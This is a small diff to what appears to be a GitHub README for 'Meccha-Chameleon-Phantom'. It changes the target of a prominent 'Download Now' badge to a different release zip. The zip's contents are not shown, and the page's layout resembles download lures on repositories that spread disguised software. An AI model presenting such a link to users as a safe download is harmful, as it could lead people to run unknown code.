@@ -9,7 +9,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/sectionpoemchant/Meccha-Chameleon-Phantom/releases/download/Meccha-Chameleon-Phantom/Meccha.titan.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/sectionpoemchant/Meccha-Chameleon-Phantom/releases/download/mecchapha/Meccha.Phantom.zip)
 
 
 
